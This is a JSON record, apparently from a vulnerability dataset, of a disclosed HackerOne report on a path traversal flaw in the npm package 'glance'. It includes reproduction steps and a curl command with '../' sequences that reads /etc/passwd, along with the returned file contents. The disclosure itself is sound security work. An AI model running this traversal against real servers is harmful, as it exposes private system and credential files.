@@ -1,0 +1,42 @@
+{
+    "reported_to": "Node.js third-party modules",
+    "reported_by": "bl4de ",
+    "title": "[glance] Path Traversal in glance static file server allows to read content of arbitrary file",
+    "content": "\nHi Guys,\nThere is Path Traversal vulnerability in glance module. This issue allows to read arbitrary files from the server, where glance is installed.\nModule\nglance\na quick disposable http server for static files\nhttps://www.npmjs.com/package/glance\nStats\n33 downloads in the last day\n34 downloads in the last week\n269 downloads in the last month\n~3000 estimated downloads per year\nDescription\nglance serves files from the server where was installed. No path sanitization is implemented, thus malicious user is able to read content of any file from the server using simple curl command (adjust number of ../ to reflect your system):\nCode 71 Bytes\n1curl -v --path-as-is http://127.0.0.1:8080/../../../../../../etc/passwd\nThe result:\nCode 1.01 KiB\n1me:~/playground/hackerone/Node$ curl -v --path-as-is http://127.0.0.1:8080/../../../../../../etc/passwd\n2*   Trying 127.0.0.1...\n3* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)\n4> GET /../../../../../../etc/passwd HTTP/1.1\n5> Host: 127.0.0.1:8080\n6> User-Agent: curl/7.47.0\n7> Accept: */*\n8> \n9< HTTP/1.1 200 OK\n10< content-type: application/octet-stream\n11< etag: 6d51e6677c898282619137b0c74f0cab\n12< last-modified: Fri, 26 Jan 2018 12:04:19 +0000\n13< content-length: 2559\n14< Date: Mon, 29 Jan 2018 10:23:45 GMT\n15< Connection: keep-alive\n16< \n17root:x:0:0:root:/root:/bin/bash\n18daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n19bin:x:2:2:bin:/bin:/usr/sbin/nologin\n20sys:x:3:3:sys:/dev:/usr/sbin/nologin\n21sync:x:4:65534:sync:/bin:/bin/sync\n22games:x:5:60:games:/usr/games:/usr/sbin/nologin\n23man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n24(..)\n25guest-cz1ton:x:999:999:Guest:/tmp/guest-cz1ton:/bin/bash\n26postgres:x:124:131:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash\n27* Connection #0 to host 127.0.0.1 left intact\n28me:~/playground/hackerone/Node$\nSteps To Reproduce:\ninstall glance:\nCode 20 Bytes\n1$ npm install glance\nrun glance in direcotry of your choice\nCode 494 Bytes\n1me:~/playground/hackerone/Node$ ./node_modules/glance/bin/glance.js --verbose --dir ./node_modules/\n2glance serving node_modules/ on port 8080\n3::1 read node_modules/\n4::1 read node_modules/bash-color/\n5::1 read node_modules/bash-color/README.md\n6::1 read ./\n7::1 read malware_frame.html\n8::1 read malware.js\n9ERR404 ::ffff:127.0.0.1 on ../../../etc/passwd\n10ERR404 ::ffff:127.0.0.1 on ../../../../etc/passwd\n11::ffff:127.0.0.1 read ../../../../../etc/passwd\n12::ffff:127.0.0.1 read ../../../../../etc/passwd\nYou can see in the log above all my requests sent to glance, including curl requests from PoC, where I was able to traverse directory tree and read content of /etc/passwd file\nSupporting Material/References:\nUbuntu 16.04 LTS\nChromium 66.0.3333.0 (Developer Build) (64-bit)\nNode.js version: v8.9.4 LTS\nnpm version: 5.6.0\ncurl 7.47.0\nPlease feel free to invite module maintainer to this report. I haven't contacted maintainer as I want to keep the process of fixing and disclosing bug consistent through HackerOne platform only.\nI hope my report will help to keep Node.js ecosystem and its users safe in the future.\nRegards,\nRafal 'bl4de' Janicki\nImpact\nThis vulnerability allows malicious user to read content of arbitrary file from the server.\n\n",
+    "severity": [
+        8.6,
+        null
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "Path Traversal"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1520182440,
+    "report_url": "https://hackerone.com/reports/310106",
+    "is_multi_component": false,
+    "complexity": "LOW",
+    "novelty": "LOW",
+    "vuln_category": "CODE",
+    "steps": [
+        [
+            1,
+            "Install glance using npm: `npm install glance`"
+        ],
+        [
+            2,
+            "Run glance in a directory of your choice: `./node_modules/glance/bin/glance.js --verbose --dir ./node_modules/`"
+        ],
+        [
+            3,
+            "Use curl to exploit the path traversal vulnerability: `curl -v --path-as-is http://127.0.0.1:8080/../../../../../../etc/passwd`"
+        ]
+    ],
+    "vuln_description": "The glance module has a path traversal vulnerability that allows an attacker to read arbitrary files from the server where glance is installed. This is due to a lack of path sanitization, enabling malicious users to access sensitive files like /etc/passwd.",
+    "reason": "The vulnerability is straightforward to exploit as it involves a common path traversal technique and does not require complex interactions or state manipulations. The attack is simple and leverages a well-known vulnerability pattern.",
+    "new_complexity": "LOW",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null
+}
